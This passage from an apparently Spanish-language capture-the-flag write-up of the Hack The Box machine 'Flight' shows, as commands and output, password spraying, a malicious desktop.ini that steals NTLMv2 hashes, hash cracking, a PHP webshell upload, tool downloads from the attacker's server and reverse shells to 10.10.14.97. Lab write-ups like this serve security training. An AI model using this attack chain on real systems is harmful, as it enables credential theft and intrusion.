SMB         10.10.11.187    445    G0               flight.htb<span class="se">\I</span>.Francis                      badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         10.10.11.187    445    G0               flight.htb<span class="se">\W</span>.Walker                       badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         10.10.11.187    445    G0               flight.htb<span class="se">\C</span>.Bum                          badpwdcount: 0 baddpwdtime: 2023-04-06 12:17:59.474129+00:00
SMB         10.10.11.187    445    G0               flight.htb<span class="se">\M</span>.Gold                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         10.10.11.187    445    G0               flight.htb<span class="se">\L</span>.Kein                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         10.10.11.187    445    G0               flight.htb<span class="se">\G</span>.Lors                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         10.10.11.187    445    G0               flight.htb<span class="se">\R</span>.Cold                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         10.10.11.187    445    G0               flight.htb<span class="se">\S</span>.Moon                         badpwdcount: 2 baddpwdtime: 2023-04-06 12:41:47.520073+00:00
SMB         10.10.11.187    445    G0               flight.htb<span class="se">\k</span>rbtgt                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         10.10.11.187    445    G0               flight.htb<span class="se">\G</span>uest                          badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         10.10.11.187    445    G0               flight.htb<span class="se">\A</span>dministrator                  badpwdcount: 0 baddpwdtime: 2022-11-01 02:58:04.270580+00:00
</pre></td></tr></tbody></table></code></div></div>
<p>Copiamos todos los usuarion y probaremos un ataque de fuerza bruta para ver si alguie reutiliza la contraseña.</p>

<ul>
  <li>El archivo <strong>users</strong> cuenta con los nombres de usuario que se encuantra en disponible.</li>
  <li>el parametro <strong>continue-on-success</strong> nos permitira que ignore los matches y continue hasta terminar.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre>❯ crackmapexec smb 10.10.11.187 <span class="nt">-u</span> <span class="nb">users</span> <span class="nt">-p</span> <span class="s1">'S@Ss!K@*t13'</span> <span class="nt">--continue-on-success</span>
SMB         10.10.11.187    445    G0               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:G0<span class="o">)</span> <span class="o">(</span>domain:flight.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\O</span>.Possum:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               <span class="o">[</span>+] flight.htb<span class="se">\s</span>vc_apache:S@Ss!K@<span class="k">*</span>t13 
SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\V</span>.Stevens:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\D</span>.Truff:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\I</span>.Francis:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\W</span>.Walker:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\C</span>.Bum:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\M</span>.Gold:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\L</span>.Kein:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\G</span>.Lors:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\R</span>.Cold:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               <span class="o">[</span>+] flight.htb<span class="se">\S</span>.Moon:S@Ss!K@<span class="k">*</span>t13 
SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\k</span>rbtgt:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\G</span>uest:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\A</span>dministrator:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
</pre></td></tr></tbody></table></code></div></div>

<p>El usuario <code class="language-plaintext highlighter-rouge">S.Moon</code> reutiliza la contraseña, pésima opción. Procedemos a ver sus directorios compartidos. Necesitamos uno en el cual podamos escribir.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre>❯ crackmapexec smb 10.10.11.187 <span class="nt">-u</span> S.Moon <span class="nt">-p</span> <span class="s1">'S@Ss!K@*t13'</span> <span class="nt">--shares</span>
SMB         10.10.11.187    445    G0               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:G0<span class="o">)</span> <span class="o">(</span>domain:flight.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.187    445    G0               <span class="o">[</span>+] flight.htb<span class="se">\S</span>.Moon:S@Ss!K@<span class="k">*</span>t13 
SMB         10.10.11.187    445    G0               <span class="o">[</span>+] Enumerated shares
SMB         10.10.11.187    445    G0               Share           Permissions     Remark
SMB         10.10.11.187    445    G0               <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.10.11.187    445    G0               ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.10.11.187    445    G0               C<span class="nv">$ </span>                             Default share
SMB         10.10.11.187    445    G0               IPC<span class="nv">$ </span>           READ            Remote IPC
SMB         10.10.11.187    445    G0               NETLOGON        READ            Logon server share 
SMB         10.10.11.187    445    G0               Shared          READ,WRITE      
SMB         10.10.11.187    445    G0               SYSVOL          READ            Logon server share 
SMB         10.10.11.187    445    G0               Users           READ            
SMB         10.10.11.187    445    G0               Web             READ            
</pre></td></tr></tbody></table></code></div></div>

<p>Nos conectamos por <code class="language-plaintext highlighter-rouge">smbclient</code> , pero…….. no vemos nada, pero tenemos permiso de escritura.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>❯ smbclient //10.10.11.187/Shared <span class="nt">-U</span> S.Moon <span class="nt">--password</span> <span class="s1">'S@Ss!K@*t13'</span>
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Fri Apr  7 03:13:45 2023
  ..                                  D        0  Fri Apr  7 03:13:45 2023

		5056511 blocks of size 4096. 1174738 blocks available
smb: <span class="se">\&gt;</span> 
</pre></td></tr></tbody></table></code></div></div>

<p>Creamos un archivo malicioso <code class="language-plaintext highlighter-rouge">desktop.ini</code> siguiendo la guía de <a href="https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini">HackTricks</a>.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>❯ <span class="nb">echo</span> <span class="s1">'[.ShellClassInfo]'</span> <span class="o">&gt;</span> desktop.ini
❯ <span class="nb">echo </span><span class="nv">IconResource</span><span class="o">=</span><span class="se">\\</span>10.10.14.97<span class="se">\p</span>wned <span class="o">&gt;&gt;</span> desktop.ini
</pre></td></tr></tbody></table></code></div></div>
<p>Creamos otro servidor smb….</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>❯ impacket-smbserver pwned  <span class="nb">.</span> <span class="nt">-smb2support</span>
Impacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
</pre></td></tr></tbody></table></code></div></div>
<p>Subimos nuestro archivo malicioso</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>smb: <span class="se">\&gt;</span> put desktop.ini
putting file desktop.ini as <span class="se">\d</span>esktop.ini <span class="o">(</span>0,1 kb/s<span class="o">)</span> <span class="o">(</span>average 0,1 kb/s<span class="o">)</span>
smb: <span class="se">\&gt;</span> 
</pre></td></tr></tbody></table></code></div></div>

<p>Esperamos unos minutos hasta que el usuario haga click en el archivo y nos llegará el hash <code class="language-plaintext highlighter-rouge">NTLMv2</code></p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre>❯ impacket-smbserver pwned  <span class="nb">.</span> <span class="nt">-smb2support</span>
Impacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.10.11.187,52884<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>flight.htb<span class="se">\c</span>.bum,G0<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User G0<span class="se">\c</span>.bum authenticated successfully
<span class="o">[</span><span class="k">*</span><span class="o">]</span> c.bum::flight.htb:aaaaaaaaaaaaaaaa:0655e313d46e69ab9af3c1b5f235a237:01010000000000000071af45e768d90189f5ed66e4153edb00000000010010004e006d006900720051004d004b004300030010004e006d006900720051004d004b00430002001000510055006800770069004d004f004d0004001000510055006800770069004d004f004d00070008000071af45e768d9010600040002000000080030003000000000000000000000000030000081294c43d7cd65ed148da6b446d86fa48a22e78a3c88765b131783f7454f633b0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00390037000000000000000000
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closing down connection <span class="o">(</span>10.10.11.187,52884<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Remaining connections <span class="o">[]</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Volvemos a crakearlo.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
Will run 4 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
Tikkycoll_431012284 <span class="o">(</span>c.bum<span class="o">)</span>
1g 0:00:00:07 DONE <span class="o">(</span>2023-04-06 20:25<span class="o">)</span> 0.1270g/s 1338Kp/s 1338Kc/s 1338KC/s TinyMutt69..Tiffani29
Use the <span class="s2">"--show --format=netntlmv2"</span> options to display all of the cracked passwords reliably
Session completed
</pre></td></tr></tbody></table></code></div></div>
<p>Conseguimos la contraseña de <code class="language-plaintext highlighter-rouge">C.Bum</code>. Listamos si tenemos un recurso con permiso de escritura.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre>❯ crackmapexec smb 10.10.11.187 <span class="nt">-u</span> C.Bum <span class="nt">-p</span> <span class="s1">'Tikkycoll_431012284'</span> <span class="nt">--shares</span>
SMB         10.10.11.187    445    G0               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:G0<span class="o">)</span> <span class="o">(</span>domain:flight.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.187    445    G0               <span class="o">[</span>+] flight.htb<span class="se">\C</span>.Bum:Tikkycoll_431012284 
SMB         10.10.11.187    445    G0               <span class="o">[</span>+] Enumerated shares
SMB         10.10.11.187    445    G0               Share           Permissions     Remark
SMB         10.10.11.187    445    G0               <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.10.11.187    445    G0               ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.10.11.187    445    G0               C<span class="nv">$ </span>                             Default share
SMB         10.10.11.187    445    G0               IPC<span class="nv">$ </span>           READ            Remote IPC
SMB         10.10.11.187    445    G0               NETLOGON        READ            Logon server share 
SMB         10.10.11.187    445    G0               Shared          READ,WRITE      
SMB         10.10.11.187    445    G0               SYSVOL          READ            Logon server share 
SMB         10.10.11.187    445    G0               Users           READ            
SMB         10.10.11.187    445    G0               Web             READ,WRITE      
</pre></td></tr></tbody></table></code></div></div>

<p>Vemos que en <code class="language-plaintext highlighter-rouge">Shares</code> y en <code class="language-plaintext highlighter-rouge">Web</code>, entramos con <code class="language-plaintext highlighter-rouge">smbclient</code>.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre>❯ smbclient //10.10.11.187/Web <span class="nt">-U</span> C.Bum <span class="nt">--password</span> <span class="s1">'Tikkycoll_431012284'</span>
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Fri Apr  7 03:29:21 2023
  ..                                  D        0  Fri Apr  7 03:29:21 2023
  flight.htb                          D        0  Fri Apr  7 03:27:01 2023
  school.flight.htb                   D        0  Fri Apr  7 03:27:01 2023

		5056511 blocks of size 4096. 1174531 blocks available
smb: <span class="se">\&gt;</span> 
</pre></td></tr></tbody></table></code></div></div>
<p>Subimos una <code class="language-plaintext highlighter-rouge">WebShell.php</code> podemos usar <a href="https://github.com/WhiteWinterWolf/wwwolf-php-webshell">esta</a>.
| Nota: Es posble que tengas que subir mas de una, ya que al cabo de unos segundos se elimina.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>smb: <span class="se">\&gt;</span> <span class="nb">cd </span>flight.htb<span class="se">\</span>
smb: <span class="se">\f</span>light.htb<span class="se">\&gt;</span> put webshell.php
putting file webshell.php as <span class="se">\f</span>light.htb<span class="se">\w</span>ebshell.php <span class="o">(</span>15,5 kb/s<span class="o">)</span> <span class="o">(</span>average 10,3 kb/s<span class="o">)</span>
smb: <span class="se">\f</span>light.htb<span class="se">\&gt;</span> 
</pre></td></tr></tbody></table></code></div></div>
<p>Abrimos la <code class="language-plaintext highlighter-rouge">WebShell</code>….
<img data-src="/assets/img/commons/Flight-writeup/2.png" alt="Hacker " class="center-image" data-proofer-ignore>
<em>Web Shell</em></p>

<p>Creamos una carpeta en <code class="language-plaintext highlighter-rouge">C:\</code>….
<img data-src="/assets/img/commons/Flight-writeup/3.png" alt="Hacker " class="center-image" data-proofer-ignore>
<em>Web Shell</em></p>

<p>Procedemos a descargar <a href="https://github.com/int0x33/nc.exe/">netcat</a>, pero primero creamos un servidor python</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>❯ python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
</pre></td></tr></tbody></table></code></div></div>
<p><img data-src="/assets/img/commons/Flight-writeup/4.png" alt="Hacker " class="center-image" data-proofer-ignore>
<em>Web SHell</em></p>

<p>Ahora lo ejecutamos..</p>

<p><img data-src="/assets/img/commons/Flight-writeup/5.png" alt="Hacker " class="center-image" data-proofer-ignore>
<em>Web SHell</em></p>

<p>Como vemos nos llega la shell.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>❯ rlwrap nc <span class="nt">-lvnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.97] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.187] 53036
Windows PowerShell 
Copyright <span class="o">(</span>C<span class="o">)</span> Microsoft Corporation. All rights reserved.

PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\f</span>light.htb&gt; 
</pre></td></tr></tbody></table></code></div></div>
<p>Pero somos <code class="language-plaintext highlighter-rouge">svc_apache</code>.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\f</span>light.htb&gt; <span class="nb">whoami
whoami
</span>flight<span class="se">\s</span>vc_apache
PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\f</span>light.htb&gt; 
</pre></td></tr></tbody></table></code></div></div>
<h2 id="movimientos-laterales"><span class="mr-2">Movimientos laterales</span><a href="#movimientos-laterales" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>Tenemos la contraseña de <code class="language-plaintext highlighter-rouge">C.Bum</code> podemos probarlas con <code class="language-plaintext highlighter-rouge">RunasCs.exe</code>, la descargamos de <a href="https://github.com/antonioCoco/RunasCs/releases">aquí</a>.</p>

<blockquote>
  <p><strong>By ChatGPT:</strong> “RunasCs.exe” es un archivo ejecutable que se utiliza para iniciar una aplicación de consola de Windows con privilegios elevados. La herramienta “runas” se usa para ejecutar programas con permisos de administrador o de otro usuario en Windows. “RunasCs.exe” es una versión personalizada de la herramienta “runas” que puede ejecutar scripts de PowerShell desde una consola de Windows con permisos elevados.</p>
</blockquote>

<blockquote>
  <p>En resumen, “RunasCs.exe” es un archivo ejecutable que se utiliza para ejecutar aplicaciones con permisos elevados en una consola de Windows y, en particular, es útil para ejecutar scripts de PowerShell con permisos de administrador o de otro usuario. Es importante tener cuidado al usar esta herramienta y solo ejecutar archivos de fuentes confiables, ya que puede ser potencialmente peligroso si se usa incorrectamente.</p>
</blockquote>

<p>Ya saben.</p>

<ul>
  <li>servidor python</li>
</ul>

<p>Descargamos el archivo…</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\f</span>light.htb&gt; curl 10.10.14.97/RunasCs.exe <span class="nt">-o</span> RunasCs.exe
curl 10.10.14.97/RunasCs.exe <span class="nt">-o</span> RunasCs.exe
PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\f</span>light.htb&gt; 
</pre></td></tr></tbody></table></code></div></div>

<p>Nos ponemos en escucha de nuevo.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>❯ nc <span class="nt">-lvnp</span> 443
listening on <span class="o">[</span>any] 443 ...
</pre></td></tr></tbody></table></code></div></div>

<p>Y ejecutamos…..</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\f</span>light.htb&gt; .<span class="se">\R</span>unasCs.exe C.Bum Tikkycoll_431012284 powershell <span class="nt">-r</span> 10.10.14.97:443
.<span class="se">\R</span>unasCs.exe C.Bum Tikkycoll_431012284 powershell <span class="nt">-r</span> 10.10.14.97:443
<span class="o">[</span>+] Running <span class="k">in </span>session 0 with process <span class="k">function </span>CreateProcessWithLogonW<span class="o">()</span>
<span class="o">[</span>+] Using Station<span class="se">\D</span>esktop: Service-0x0-5cb14<span class="nv">$\</span>Default
<span class="o">[</span>+] Async process <span class="s1">'powershell'</span> with pid 3692 created and left <span class="k">in </span>background.
PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\f</span>light.htb&gt; 
</pre></td></tr></tbody></table></code></div></div>

<p>Ahora recibimos la shell como <code class="language-plaintext highlighter-rouge">C.Bum</code>.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
whoami
</span>flight<span class="se">\c</span>.bum
PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; 
</pre></td></tr></tbody></table></code></div></div>
<p>Procedemos a leer la primera flag.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\C</span>.Bum<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\C</span>.Bum<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
87<span class="k">****************************</span>1c
PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; 
</pre></td></tr></tbody></table></code></div></div>
<h2 id="escalada-de-privilegios"><span class="mr-2">Escalada de privilegios</span><a href="#escalada-de-privilegios" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Viendo puertos abiertos vemos este puerto.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre></td><td class="rouge-code"><pre>PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; netstat <span class="nt">-oat</span>
netstat <span class="nt">-oat</span>

Active Connections

  Proto  Local Address          Foreign Address        State           PID      Offload State

  TCP    0.0.0.0:80             g0:0                   LISTENING       4752	InHost      
  TCP    0.0.0.0:88             g0:0                   LISTENING       652	InHost      
  TCP    0.0.0.0:135            g0:0                   LISTENING       920	InHost      
  TCP    0.0.0.0:389            g0:0                   LISTENING       652	InHost      
  TCP    0.0.0.0:443            g0:0                   LISTENING       4752	InHost      
  TCP    0.0.0.0:445            g0:0                   LISTENING       4	InHost      
  TCP    0.0.0.0:464            g0:0                   LISTENING       652	InHost      
  TCP    0.0.0.0:593            g0:0                   LISTENING       920	InHost      
  TCP    0.0.0.0:636            g0:0                   LISTENING       652	InHost      
  TCP    0.0.0.0:3268           g0:0                   LISTENING       652	InHost      
  TCP    0.0.0.0:3269           g0:0                   LISTENING       652	InHost      
  TCP    0.0.0.0:5985           g0:0                   LISTENING       4	InHost      
  TCP    0.0.0.0:8000           g0:0                   LISTENING       4	InHost      
  TCP    0.0.0.0:9389           g0:0                   LISTENING       2744	InHost      
